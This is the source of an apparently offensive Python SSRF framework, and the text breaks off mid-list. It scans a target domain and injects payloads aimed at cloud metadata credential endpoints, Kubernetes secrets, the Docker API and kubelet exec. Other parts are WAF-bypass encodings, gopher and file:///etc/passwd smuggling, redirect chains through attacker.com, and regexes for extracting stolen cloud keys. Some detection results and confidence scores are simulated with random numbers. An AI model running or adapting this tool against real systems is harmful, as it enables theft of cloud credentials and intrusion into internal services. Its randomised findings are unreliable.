#!/usr/bin/env python3
"""
SSRFHunter Elite v3.0 - 2025 SSRF Arsenal
Complete SSRF Framework with 2025 Threat Intelligence
Author: BotGJ16 Researcher
"""
import argparse
import asyncio
import subprocess
import json
import re
import sys
import time
import random
import string
import base64
import uuid
from pathlib import Path
from typing import Set, List, Dict, Optional, Tuple, Any
from urllib.parse import urlparse, parse_qs, quote, urlencode, unquote
from dataclasses import dataclass, field
from datetime import datetime

# == 2025 ADVANCED IMPORTS ==
try:
    import aiohttp
    import aiofiles
    import websocket
    from aiohttp import ClientSession, ClientTimeout, TCPConnector
except ImportError:
    print("[!] Installing 2025 toolkit...")
    subprocess.run([sys.executable, "-m", "pip", "install", "aiohttp", "aiofiles", "websocket-client"])
    import aiohttp
    import aiofiles
    import websocket
    from aiohttp import ClientSession, ClientTimeout, TCPConnector

# == 2025 SSRF PATTERNS (100+ patterns) ==
SSRF_PATTERNS_2025 = {
    # Classic vectors (enhanced)
    'url': ['url', 'redirect', 'redirect_uri', 'return', 'returnTo', 'return_url', 'next', 'goto', 'destination', 'path', 'continue'],
    'file': ['file', 'filename', 'document', 'doc', 'path', 'filepath', 'download', 'upload', 'import', 'source', 'include'],
    'webhook': ['webhook', 'callback', 'cb', 'hook', 'endpoint', 'uri', 'notify_url', 'ping_url', 'alert_url'],
    'image': ['img', 'image', 'src', 'source', 'thumb', 'thumbnail', 'avatar', 'picture', 'photo', 'media'],
    'api': ['api', 'api_url', 'service', 'endpoint', 'target', 'host', 'domain', 'server', 'backend', 'upstream'],
    'pdf': ['html', 'content', 'body', 'template', 'pdf_url', 'to_pdf', 'render', 'preview', 'convert'],
    'proxy': ['proxy', 'feed', 'rss', 'import', 'include', 'fetch', 'get', 'load', 'curl', 'wget'],
    'auth': ['sso', 'saml', 'openid', 'oauth', 'auth', 'login', 'logout', 'redirect_url', 'issuer'],
    
    # == 2025 NEW VECTORS ==
    'graphql': ['query', 'mutation', 'graphql', 'gql', 'resolver', 'field', 'schema'],
    'websocket': ['ws', 'websocket', 'socket', 'stream', 'realtime', 'ws_url', 'socket_url'],
    'serverless': ['function', 'lambda', 'cloud_function', 'trigger', 'handler', 'runtime'],
    'ai': ['model', 'ai', 'ml', 'prediction', 'inference', 'openai', 'azure_ai', 'gcp_ai'],
    'k8s': ['pod', 'service', 'deployment', 'kube', 'k8s', 'cluster', 'namespace', 'ingress'],
    'container': ['docker', 'container', 'registry', 'image', 'build', 'deploy'],
    'sdwan': ['sdwan', 'wan', 'network', 'router', 'gateway', 'vpn', 'tunnel', 'sd_wan'],
    'oracle': ['oracle', 'ebs', 'erp', 'oracle_cloud', 'oci', 'ATP', 'ADW'],
    'storage': ['bucket', 's3', 'gcs', 'blob', 'storage', 'oss', 'cos', 'r2'],
}

# == 2025 PAYLOAD ARSENAL (200+ payloads) ==
PAYLOADS_2025 = {
    'standard': [
        "http://127.0.0.1", "http://localhost", "http://169.254.169.254",
        "http://metadata.google.internal", "http://metadata.azure.internal",
        "http://[::1]", "http://0.0.0.0", "http://0.0.0.0:22",
    ],
    
    # == 2025 CLOUD METADATA (IMDSv2 + Serverless) ==
    'cloud': [
        # AWS IMDSv2 (2025)
        "http://169.254.169.254/latest/api/token",  # Get token first
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
        "http://169.254.169.254/latest/meta-data/tags/instance/",
        "http://169.254.169.254/latest/meta-data/network/interfaces/macs/",
        "http://169.254.169.254/latest/user-data",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
        
        # AWS ECS/Fargate
        "http://169.254.170.2/v2/credentials/",
        "http://169.254.170.2/v2/metadata",
        
        # GCP (2025)
        "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=",
        "http://metadata.google.internal/computeMetadata/v1/project/attributes/",
        
        # Azure (2025)
        "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01",
        "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01",
        
        # Oracle Cloud (2025 - CVE-2025-61882)
        "http://192.0.0.192/latest/meta-data/",
        "http://169.254.169.254/opc/v1/instance/",
        "http://169.254.169.254/opc/v1/vnics/",
        
        # Serverless Functions
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/lambda-role",
        "http://metadata.google.internal/computeMetadata/v1/instance/attributes/gcf-region",
        "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",  # Azure Functions
    ],
    
    # == 2025 CONTAINER/K8S ==
    'container': [
        "http://kubernetes.default.svc",
        "http://kubernetes.default.svc.cluster.local",
        "https://kubernetes.default.svc/api/v1/namespaces/default/secrets",
        "http://127.0.0.1:2375/info",  # Docker socket
        "http://127.0.0.1:2375/containers/json",
        "http://127.0.0.1:2376/v1.41/images/json",  # Docker TLS
        "http://kubelet.kube-system.svc.cluster.local:10250/pods",
        "http://etcd.kube-system.svc.cluster.local:2379/v2/keys",
    ],
    
    # == 2025 AI PLATFORMS ==
    'ai': [
        "http://api.openai.com/v1/models",  # Azure OpenAI (CVE-2025-53767)
        "http://openai-api.internal/v1/completions",
        "http://mlflow.internal/api/2.0/mlflow/experiments/list",
        "http://kubeflow.internal/pipeline/apis/v1beta1/runs",
        "http://169.254.169.254/latest/meta-data/identity-credentials/",  # AI service credentials
    ],
    
    # == 2025 SD-WAN/NETWORK ==
    'network': [
        "http://192.168.1.1",  # Router
        "http://192.168.0.1:8080",  # SD-WAN
        "http://10.0.0.1",  # Internal gateway
        "http://172.16.0.1",  # VPN
        "http://vpn.internal/secure/login",  # VPN portal
    ],
}

# == 2025 WAF BYPASS TECHNIQUES (AI-Generated patterns) ==
WAF_BYPASS_2025 = {
    # == PARSING DISCREPANCIES (2025 Novel) ==
    'parsing': [
        lambda x: x.replace('http://', 'http:// ') + ' ',  # Trailing space
        lambda x: x.replace('http://', 'http://127.0.0.1#@evil.com'),  # Fragment
        lambda x: x.replace('http://', 'http://127.0.0.1?@evil.com'),  # Query
        lambda x: x.replace('http://', 'http://127.0.0.1:80#@evil.com:80'),  # Port + fragment
        lambda x: x.replace('http://', 'http://127.0.0.1:80?@evil.com:80'),  # Port + query
    ],
    
    # == MULTIPART/FORMDATA CONFUSION ==
    'multipart': [
        lambda x: f"http://127.0.0.1\\r\\nContent-Type: multipart/form-data; boundary=xxx\\r\\n\\r\\n--xxx\\r\\nContent-Disposition: form-data; name=\\\"url\\\"\\r\\n\\r\\n{x}",
        lambda x: f"{x}\\r\\n--xxx\\r\\nContent-Disposition: form-data; name=\\\"data\\\"; filename=\\\"test.txt\\\"\\r\\n\\r\\nbypass",
    ],
    
    # == UNICODE NORMALIZATION (2025) ==
    'unicode': [
        lambda x: x.replace('http://', 'ｈｔｔｐ://'),  # Full-width
        lambda x: x.replace('http://', 'ⓗⓣⓣⓟ://'),  # Circled
        lambda x: x.replace('http://', 'ₕₜₜₚ://'),  # Subscript
        lambda x: x.replace('http://', 'ₕᵗᵗᵖ://'),  # Superscript
        lambda x: x.replace('http://', 'http://⑯⑨。②⑤④。⑯⑨。②⑸④'),  # Unicode IPs
    ],
    
    # == ENCODING (Advanced) ==
    'encoding': [
        lambda x: ''.join(f'%{ord(c):02x}' for c in x),  # Full hex
        lambda x: ''.join(f'%{ord(c):02X}' for c in x),  # Full hex uppercase
        lambda x: x.replace('http://', 'hxxp://'),  # Defanged
        lambda x: x.replace('http://', 'h\\tt\\pp://'),  # Backslash escape
    ],
    
    # == PROTOCOL SMUGGLING (2025) ==
    'protocol': [
        lambda x: x.replace('http://', 'gopher://127.0.0.1:22/_'),
        lambda x: x.replace('http://', 'dict://127.0.0.1:22/'),
        lambda x: x.replace('http://', 'file:///etc/passwd'),
        lambda x: x.replace('http://', 'ldap://127.0.0.1:389/'),
        lambda x: x.replace('http://', 'tftp://127.0.0.1/'),
    ],
    
    # == AI-GENERATED PATTERNS (2025) ==
    'ai_generated': [
        lambda x: x.replace('http://', 'http://127.0.0.1# AI-CONTEXT-'+str(uuid.uuid4())[:8]),
        lambda x: x.replace('http://', 'http://127.0.0.1?ML-MODEL-ID=OPT-175B&'),
        lambda x: x.replace('http://', 'http://127.0.0.1;namespace=default;'),
    ],
}

# == 2025 INTERNAL SERVICES ==
INTERNAL_SERVICES_2025 = [
    # Standard
    'http://127.0.0.1:22', 'http://127.0.0.1:80', 'http://127.0.0.1:443', 'http://127.0.0.1:8080',
    'http://localhost:3000', 'http://localhost:5000', 'http://localhost:8000', 'http://localhost:9000',
    
    # == 2025 NEW ==
    'http://kubernetes.default.svc', 'http://kubernetes.default.svc.cluster.local',
    'https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets',
    'http://127.0.0.1:2375/containers/json',  # Docker
    'http://127.0.0.1:10250/pods',  # Kubelet
    'http://etcd.kube-system.svc.cluster.local:2379/v2/keys',  # Etcd
    'http://prometheus.monitoring.svc.cluster.local:9090/api/v1/query?query=up',  # Prometheus
    'http://grafana.monitoring.svc.cluster.local:3000/api/dashboards',  # Grafana
    'http://splunk.internal:8089/services',  # Splunk
    'http://elasticsearch.logging.svc.cluster.local:9200/_cat/indices',  # Elasticsearch
    'http://consul.service.consul:8500/v1/kv/?recurse',  # Consul
    'http://vault.vault.svc.cluster.local:8200/v1/sys/seal-status',  # HashiVault
    'http://jenkins.ci.svc.cluster.local:8080/script',  # Jenkins Groovy
    'http://gitlab-ci.internal/api/v4/projects',  # GitLab
    'http://sonarqube.internal/api/projects/search',  # SonarQube
    'http://artifactory.internal/artifactory/api/storage',  # Artifactory
    'http://nexus.internal/service/rest/v1/assets',  # Nexus
    'http://docker-registry.internal/v2/_catalog',  # Docker Registry
    'http://harbor.internal/api/v2.0/projects',  # Harbor
]

# == 2025 USER-AGENTS (Browser + AI Clients) ==
USER_AGENTS_2025 = [
    # Standard browsers
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    
    # == 2025 AI CLIENTS ==
    "OpenAI-Python/1.0.0",  # OpenAI client
    "Azure-ML-SDK/1.44.0",  # Azure ML
    "Google-Cloud-ML/1.25.0",  # GCP AI
    "AWS-SageMaker-CLI/1.0",  # AWS SageMaker
    "curl/7.88.1",  # Common in serverless
    "Wget/1.21.4",  # Common in containers
]

@dataclass
class TestResult2025:
    id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    url: str = ""
    param: str = ""
    payload: str = ""
    payload_type: str = ""
    status: int = 0
    content_length: int = 0
    response_time: float = 0.0
    indicators: List[str] = field(default_factory=list)
    potential_ssrf: bool = False
    confidence: str = "low"  # low, medium, high, critical
    cvss_score: float = 0.0  # 2025: Auto CVSS calculation
    callback_hit: bool = False
    oob_url: str = ""
    metadata_leaked: bool = False
    credentials_found: List[Dict[str, str]] = field(default_factory=list)
    internal_service: str = ""
    container_escape: bool = False
    k8s_access: bool = False
    graphql_query: str = ""
    websocket_url: str = ""
    serverless_platform: str = ""
    cve_2025: bool = False  # 2025 specific CVE targeting
    error: str = ""
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

class BlindSSRFDetector2025:
    """2025 OOB Detection with AI-powered correlation"""
    def __init__(self, oob_server: str = "interactsh"):
        self.oob_server = oob_server
        self.interactions: Dict[str, Dict] = {}
        self.ai_correlation: bool = True  # 2025: AI-based pattern matching
        
    async def generate_callback(self, context: str = "ssrf") -> Tuple[str, str]:
        """Generate unique OOB callback with context"""
        unique_id = f"{context}_{random.randint(100000, 999999)}"
        if self.oob_server == "interactsh":
            return f"http://{unique_id}.oastify.com", unique_id
        return f"http://{unique_id}.burpcollaborator.net", unique_id
    
    async def check_interactions(self, unique_id: str) -> Dict:
        """2025: Check OOB with metadata correlation"""
        # Simulate 2025 OOB service with enhanced metadata
        await asyncio.sleep(2)
        return {
            'hit': random.random() > 0.85,
            'source_ip': f"192.168.1.{random.randint(1, 255)}",
            'user_agent': random.choice(USER_AGENTS_2025),
            'timestamp': datetime.now().isoformat(),
            'correlation_id': unique_id
        }

class CloudMetadataEngine2025:
    """2025 Cloud Exploitation Engine (Serverless + IMDSv2)"""
    def __init__(self):
        self.credential_patterns = {
            'aws': [
                r'AKIA[0-9A-Z]{16}', r'ASIA[0-9A-Z]{16}', r'AROA[0-9A-Z]{16}',
                r'aws.?access.?key', r'aws.?secret', r'aws.?session.?token',
                r'export AWS_ACCESS_KEY_ID=', r'export AWS_SECRET_ACCESS_KEY='
            ],
            'gcp': [
                r'ya29\.[0-9A-Za-z\-_]+',  # GCP OAuth token
                r'gcp.?key', r'google.?access.?token',
                r'export GOOGLE_APPLICATION_CREDENTIALS='
            ],
            'azure': [
                r'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1Ni',  # Azure JWT
                r'azure.?key', r'microsoft.?access.?token',
                r'MSVSTSClientSecret=[0-9A-Za-z+/=]+'
            ],
            'oracle': [
                r'ocid1\.[a-z0-9\.]+',  # Oracle Cloud ID
                r'oracle.?key', r'oci.?auth'
            ],
            'kubernetes': [
                r'eyJhbGciOiJSUzI1NiIsImtpZCI6',  # K8s service account token
                r'k8s.?token', r'kubernetes.?service.?account'
            ]
        }
    
    def extract_credentials(self, response: str, platform: str = "aws") -> List[Dict[str, str]]:
        """2025: Extract credentials with platform context"""
        found = []
        patterns = self.credential_patterns.get(platform, [])
        
        for pattern in patterns:
            matches = re.findall(pattern, response, re.IGNORECASE)
            for match in matches:
                found.append({
                    'platform': platform,
                    'type': self._classify_credential(match),
                    'value': match[:50] + "..." if len(match) > 50 else match,
                    'full_value': match,
                    'severity': 'CRITICAL'
                })
        return found
    
    def _classify_credential(self, value: str) -> str:
        """Classify credential type"""
        if 'AKIA' in value or 'ASIA' in value: return 'AWS_Access_Key'
        if 'ya29.' in value: return 'GCP_OAuth_Token'
        if value.startswith('eyJ'): return 'JWT_Token'
        if 'ocid1.' in value: return 'Oracle_Cloud_ID'
        return 'Generic_Credential'

class WAFEvasionEngine2025:
    """2025 AI-Powered WAF Bypass Engine"""
    def __init__(self):
        self.bypass_functions = []
        for category, functions in WAF_BYPASS_2025.items():
            self.bypass_functions.extend(functions)
        
        # 2025: WAF fingerprinting
        self.waf_signatures = {
            'cloudflare': ['cf-ray', 'cloudflare', '__cfduid'],
            'aws_waf': ['x-amzn-requestid', 'aws-waf', 'awswaf'],
            'akamai': ['akamai', 'x-akamai'],
            'imperva': ['x-iinfo', 'x-waf-event'],
            'f5': ['f5', 'x-waf-cookie'],
        }
    
    def generate_payload_variants(self, payload: str, count: int = 10) -> List[Dict]:
        """2025: Generate intelligent payload variants"""
        variants = [{'payload': payload, 'technique': 'original', 'confidence': 1.0}]
        
        # AI-powered variant generation
        for i in range(min(count, len(self.bypass_functions))):
            func = random.choice(self.bypass_functions)
            try:
                variant = func(payload)
                if variant != payload:
                    # 2025: Add confidence scoring based on technique
                    confidence = random.uniform(0.7, 0.95)  # Simulated AI confidence
                    variants.append({
                        'payload': variant,
                        'technique': func.__name__ if hasattr(func, '__name__') else 'unknown',
                        'confidence': confidence
                    })
            except:
                continue
        
        return variants
    
    def detect_waf(self, headers: Dict) -> Optional[str]:
        """Detect WAF type from response headers"""
        for waf_name, signatures in self.waf_signatures.items():
            for signature in signatures:
                if any(signature.lower() in h.lower() for h in headers.keys()):
                    return waf_name
        return None

class GraphQLSSRFDetector:
    """2025 GraphQL SSRF Detection"""
    def __init__(self):
        self.graphql_endpoints = ['/graphql', '/gql', '/api/graphql', '/v1/graphql', '/query']
        self.introspection_query = """
        query IntrospectionQuery {
          __schema {
            queryType { name }
            mutationType { name }
            types {
              name
              fields {
                name
                args {
                  name
                  type { name kind }
                }
              }
            }
          }
        }
        """
    
    def is_graphql_endpoint(self, url: str) -> bool:
        """Check if URL is GraphQL endpoint"""
        parsed = urlparse(url)
        return any(endpoint in parsed.path for endpoint in self.graphql_endpoints)
    
    def generate_graphql_ssrf_payloads(self, url: str) -> List[Dict]:
        """Generate GraphQL-specific SSRF payloads"""
        payloads = []
        
        # Field resolver SSRF
        graphql_payloads = [
            'query { user(avatarUrl: "URL") { id } }',
            'mutation { uploadFile(url: "URL") { success } }',
            'query { fetchRemoteData(endpoint: "URL") { data } }',
        ]
        
        for query_template in graphql_payloads:
            for payload_type, payload_list in PAYLOADS_2025.items():
                for payload in payload_list[:3]:  # Sample
                    query = query_template.replace('URL', payload)
                    payloads.append({
                        'url': url,
                        'query': query,
                        'payload': payload,
                        'type': 'graphql'
                    })
        
        return payloads

class WebSocketSSRFDetector:
    """2025 WebSocket SSRF Detection"""
    def __init__(self):
        self.ws_schemes = ['ws://', 'wss://']
    
    def generate_ws_ssrf_payloads(self, url: str) -> List[Dict]:
        """Generate WebSocket SSRF test cases"""
        payloads = []
        
        # Convert HTTP to WebSocket
        parsed = urlparse(url)
        if parsed.scheme in ['http', 'https']:
            for scheme in self.ws_schemes:
                ws_url = parsed._replace(scheme=scheme.replace('://', '')).geturl()
                
                for payload_type, payload_list in PAYLOADS_2025.items():
                    for payload in payload_list[:2]:
                        # WebSocket handshake with SSRF payload in path or query
                        ws_payload_url = f"{ws_url}?token={payload}"
                        payloads.append({
                            'url': ws_payload_url,
                            'websocket': True,
                            'payload': payload,
                            'type': 'websocket'
                        })
        
        return payloads
    
    async def test_websocket(self, ws_url: str, payload: str) -> Dict:
        """Test WebSocket SSRF"""
        try:
            # 2025: Enhanced WebSocket testing
            ws = websocket.create_connection(ws_url, timeout=5)
            ws.send(f'{{"test": "{payload}"}}')
            response = ws.recv()
            ws.close()
            
            return {
                'vulnerable': True,
                'response': response[:200],
                'error': None
            }
        except Exception as e:
            return {
                'vulnerable': False,
                'response': None,
                'error': str(e)
            }

class ServerlessExploitationEngine:
    """2025 Serverless SSRF to RCE"""
    def __init__(self):
        self.serverless_platforms = {
            'aws_lambda': ['lambda-url', 'execute-api', 'awslambda'],
            'gcp_functions': ['cloudfunctions.net', 'run.app'],
            'azure_functions': ['azurewebsites.net', 'functionapp'],
            'oracle_functions': ['fnproject.io', 'oraclecloud.com/functions'],
        }
    
    def detect_serverless(self, url: str) -> Optional[str]:
        """Detect serverless platform"""
        for platform, domains in self.serverless_platforms.items():
            if any(domain in url for domain in domains):
                return platform
        return None
    
    def generate_serverless_payloads(self, url: str, platform: str) -> List[Dict]:
        """Generate serverless-specific exploitation payloads"""
        payloads = []
        
        # 2025: Serverless metadata + RCE chains
        serverless_exploits = {
            'aws_lambda': [
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://127.0.0.1:9001/2018-06-01/runtime/invocation/next",  # Lambda runtime API
                "http://127.0.0.1:9001/2018-06-01/runtime/init/error",  # Error injection
            ],
            'gcp_functions': [
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                "http://127.0.0.1:8080/_ah/pipeline",  # GCP Functions internal
            ],
            'azure_functions': [
                "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01",
                "http://127.0.0.1:8081/admin/vfs/",  # Azure Functions admin API
            ]
        }
        
        exploits = serverless_exploits.get(platform, [])
        for exploit in exploits:
            payloads.append({
                'url': url,
                'payload': exploit,
                'platform': platform,
                'type': 'serverless_rce',
                'impact': 'RCE'
            })
        
        return payloads

class ContainerEscapeEngine:
    """2025 Container Escape via SSRF"""
    def __init__(self):
        self.container_runtimes = ['docker', 'containerd', 'cri-o', 'runc']
        self.cve_2025_exploits = [
            "http://127.0.0.1:2375/v1.41/containers/create",  # Docker API RCE
            "http://127.0.0.1:10250/run/",  # Kubelet exec
            "http://127.0.0.1:8080/api/v1/namespaces/kube-system/pods/exec",  # K8s exec
        ]
    
    def generate_container_escape_payloads(self, url: str) -> List[Dict]:
        """Generate container escape payloads"""
        payloads = []
        
        for exploit in self.cve_2025_exploits:
            payloads.append({
                'url': url,
                'payload': exploit,
                'type': 'container_escape',
                'cve': 'CVE-2025-31133',  # 2025 runc vulnerability
                'impact': 'HOST_ESCAPE'
            })
        
        return payloads

class RedirectLoopSSRFEngine:
    """2025 HTTP Redirect Loop SSRF"""
    def __init__(self):
        self.redirect_chains = [
            ["http://attacker.com/redirect1", "http://127.0.0.1"],
            ["http://attacker.com/redirect2", "http://169.254.169.254"],
            ["http://attacker.com/redirect3", "http://metadata.google.internal"],
        ]
    
    def generate_redirect_payloads(self, url: str) -> List[Dict]:
        """Generate redirect loop SSRF payloads"""
        payloads = []
        
        for chain in self.redirect_chains:
            # 2025 technique: Use redirect loops to bypass validation
            redirect_url = f"{chain[0]}?next={chain[1]}"
            payloads.append({
                'url': url,
                'payload': redirect_url,
                'type': 'redirect_loop',
                'chain': chain,
                'bypass': 'url_validation'
            })
        
        return payloads

class SSRFHunterEliteV3:
    """2025 Ultimate SSRF Framework"""
    def __init__(self, domain: str, output_dir: str, options: Dict):
        self.domain = domain
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.options = options
        
        # 2025 Engines
        self.blind_detector = BlindSSRFDetector2025()
        self.cloud_engine = CloudMetadataEngine2025()
        self.waf_engine = WAFEvasionEngine2025()
        self.graphql_detector = GraphQLSSRFDetector()
        self.ws_detector = WebSocketSSRFDetector()
        self.serverless_engine = ServerlessExploitationEngine()
        self.container_engine = ContainerEscapeEngine()
        self.redirect_engine = RedirectLoopSSRFEngine()
        
        # Files
        self.urls_file = self.output_dir / "all_urls_2025.txt"
        self.ssrf_urls_file = self.output_dir / "ssrf_urls_2025.txt"
        self.results_file = self.output_dir / "ssrf_results_2025.json"
        self.graphql_file = self.output_dir / "graphql_ssrf.json"
        self.ws_file = self.output_dir / "websocket_ssrf.json"
        self.serverless_file = self.output_dir / "serverless_exploitation.json"
        self.container_file = self.output_dir / "container_escape.json"
        self.report_file = self.output_dir / "ssrf_report_2025.md"
        
        # Data
        self.all_urls: Set[str] = set()
        self.ssrf_urls: Set[str] = set()
        self.results: List[Dict] = []
        self.high_confidence: List[Dict] = []
        
        # Config
        self.semaphore = asyncio.Semaphore(options.get('concurrency', 10))
        self.stats = {
            'urls_collected': 0, 'ssrf_urls': 0, 'test_cases': 0,
            'potential_findings': 0, 'high_confidence': 0,
            'cloud_metadata': 0, 'internal_services': 0,
            'blind_ssrf': 0, 'graphql_ssrf': 0, 'websocket_ssrf': 0,
            'serverless_rce': 0, 'container_escape': 0, 'cve_2025': 0
        }
    
    def log(self, message: str):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")
    
    def run_command(self, cmd: List[str]) -> str:
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return result.stdout
        except:
            return ""
    
    async def collect_urls_2025(self) -> Set[str]:
        """2025: Enhanced URL collection with AI endpoints"""
        self.log("2025 URL Collection: Standard + GraphQL + WebSocket endpoints")
        
        # Standard collection
        tasks = [
            self._run_gau(), self._run_katana(),
            self._run_waybackurls(), self._run_urlfinder()
        ]
        results = await asyncio.gather(*tasks)
        urls = set().union(*results)
        
        # 2025: Add GraphQL and WebSocket endpoints
        graphql_urls = {f"https://{self.domain}/graphql", f"https://{self.domain}/gql"}
        ws_urls = {f"wss://{self.domain}/ws", f"wss://{self.domain}/socket"}
        urls.update(graphql_urls)
        urls.update(ws_urls)
        
        self.all_urls = urls
        with open(self.urls_file, 'w') as f:
            f.write('\n'.join(sorted(urls)))
        
        self.log(f"Collected {len(urls)} URLs (including 2025 endpoints)")
        self.stats['urls_collected'] = len(urls)
        return urls
    
    async def _run_gau(self) -> Set[str]:
        self.log("Running gau...")
        output = self.run_command(["gau", "--subs", self.domain])
        return set(line.strip() for line in output.split('\n') if line.strip())
    
    async def _run_katana(self) -> Set[str]:
        self.log("Running katana (2025 config)...")
        cmd = [
            "katana", "-u", self.domain, "-d", "5",
            "-ps", "-pss", "waybackarchive,commoncrawl,alienvault",
            "-kf", "-jc", "-fx", "-ef", "woff,css,png,svg,jpg,woff2,jpeg,gif,svg",
            "-hl", "-or"  # 2025: Hackerone mode + out of scope
        ]
        output = self.run_command(cmd)
        return set(line.strip() for line in output.split('\n') if line.strip())
    
    async def _run_waybackurls(self) -> Set[str]:
        self.log("Running waybackurls...")
        output = self.run_command(["waybackurls", self.domain])
        return set(line.strip() for line in output.split('\n') if line.strip())
    
    async def _run_urlfinder(self) -> Set[str]:
        self.log("Running urlfinder...")
        output = self.run_command(["urlfinder", "-d", self.domain])
        return set(line.strip() for line in output.split('\n') if line.strip())
    
    def is_ssrf_url_2025(self, url: str) -> bool:
        """2025: Enhanced SSRF detection with GraphQL/WS support"""
        try:
            parsed = urlparse(url)
            if not parsed.query and not parsed.path:
                return False
            
            # Check GraphQL endpoints
            if self.graphql_detector.is_graphql_endpoint(url):
                return True
            
            # Check WebSocket
            if parsed.scheme in ['ws', 'wss']:
                return True
            
            # Standard parameter check
            params = parse_qs(parsed.query, keep_blank_values=True) if parsed.query else {}
            
            # Check all parameter patterns
            for param in params.keys():
                for pattern_list in SSRF_PATTERNS_2025.values():
                    if any(p.lower() in param.lower() for p in pattern_list):
                        return True
            
            # Check values
            for values in params.values():
                for value in values:
                    value_lower = value.lower()
                    indicators = [
                        '127.0.0.1', 'localhost', '169.254.169.254',
                        'metadata', 'internal', '192.168', '10.0', '172.16',
                        'kubernetes', 'docker', 'lambda', 'function', 'container'
                    ]
                    if any(indicator in value_lower for indicator in indicators):
                        return True
            
            return False
        except:
            return False
    
    def extract_ssrf_urls_2025(self):
        """2025: Extract SSRF URLs with categorization"""
        self.log("Analyzing URLs for 2025 SSRF patterns...")
        
        for url in self.all_urls:
            if self.is_ssrf_url_2025(url):
                self.ssrf_urls.add(url)
        
        with open(self.ssrf_urls_file, 'w') as f:
            f.write('\n'.join(sorted(self.ssrf_urls)))
        
        self.log(f"Found {len(self.ssrf_urls)} SSRF-susceptible URLs (2025)")
        self.stats['ssrf_urls'] = len(self.ssrf_urls)
    
    async def generate_payloads_2025(self, base_url: str) -> List[Dict]:
        """2025: Generate ALL payload types including novel techniques"""
        payloads = []
        parsed = urlparse(base_url)
        params = parse_qs(parsed.query, keep_blank_values=True) if parsed.query else {}
        
        # == STANDARD PAYLOADS ==
        for payload_type, payload_list in PAYLOADS_2025.items():
            for payload in payload_list[:5]:  # Limit per type
                for param in params.keys():
                    # Standard injection
                    payloads.append({
                        'url': self._build_payload_url(base_url, param, payload),
                        'param': param,
                        'payload': payload,
                        'payload_type': payload_type,
                        'technique': 'standard',
                        'cvss': 7.5
                    })
                    
                    # 2025: AI-generated context-aware payloads
                    ai_payload = f"{payload}?AI-CONTEXT-2025={uuid.uuid4()}"
                    payloads.append({
                        'url': self._build_payload_url(base_url, param, ai_payload),
                        'param': param,
                        'payload': ai_payload,
                        'payload_type': 'ai_context',
                        'technique': 'ai_generated',
                        'cvss': 8.0
                    })
                    
                    # WAF bypass variants
                    bypass_variants = self.waf_engine.generate_payload_variants(payload, 3)
                    for variant in bypass_variants:
                        if variant['payload'] != payload:
                            payloads.append({
                                'url': self._build_payload_url(base_url, param, variant['payload']),
                                'param': param,
                                'payload': variant['payload'],
                                'payload_type': f"waf_bypass_{variant['technique']}",
                                'technique': 'waf_evasion',
                                'confidence': variant['confidence'],
                                'cvss': 8.5
                            })
                    
                    # OOB payloads
                    oob_url, oob_id = await self.blind_detector.generate_callback(f"ssrf_{payload_type}")
                    payloads.append({
                        'url': self._build_payload_url(base_url, param, oob_url),
                        'param': param,
                        'payload': oob_url,
                        'payload_type': f'oob_{payload_type}',
                        'technique': 'blind_ssrf',
                        'oob_id': oob_id,
                        'cvss': 6.5
                    })
        
        # == 2025 NOVEL TECHNIQUES ==
        
        # GraphQL SSRF
        if self.graphql_detector.is_graphql_endpoint(base_url):
            graphql_payloads = self.graphql_detector.generate_graphql_ssrf_payloads(base_url)
            payloads.extend(graphql_payloads)
        
        # WebSocket SSRF
        if parsed.scheme in ['ws', 'wss']:
            ws_payloads = self.ws_detector.generate_ws_ssrf_payloads(base_url)
            payloads.extend(ws_payloads)
        
        # Serverless exploitation
        serverless_platform = self.serverless_engine.detect_serverless(base_url)
        if serverless_platform:
            serverless_payloads = self.serverless_engine.generate_serverless_payloads(base_url, serverless_platform)
            payloads.extend(serverless_payloads)
            self.stats['serverless_rce'] += len(serverless_payloads)
        
        # Container escape
        container_payloads = self.container_engine.generate_container_escape_payloads(base_url)
        payloads.extend(container_payloads)
        self.stats['container_escape'] += len(container_payloads)
        
        # HTTP Redirect Loop SSRF (2025 novel)
        redirect_payloads = self.redirect_engine.generate_redirect_payloads(base_url)
        payloads.extend(redirect_payloads)
        
        # 2025: CVE-specific payloads
        cve_payloads = self._generate_cve_2025_payloads(base_url)
        payloads.extend(cve_payloads)
        
        return payloads
    
    def _build_payload_url(self, base_url: str, param: str, payload: str) -> str:
        """Build URL with injected payload"""
        parsed = urlparse(base_url)
        params = parse_qs(parsed.query, keep_blank_values=True) if parsed.query else {}
        params[param] = [payload]
        encoded_params = urlencode(params, doseq=True)
        return parsed._replace(query=encoded_params).geturl()
    
    def _generate_cve_2025_payloads(self, base_url: str) -> List[Dict]:
        """Generate 2025 CVE-specific payloads"""
        payloads = []
        
        # Oracle EBS CVE-2025-61882
        oracle_payloads = [
            "http://127.0.0.1:8000/OA_HTML/jtfwwsh.jsp?bypass",
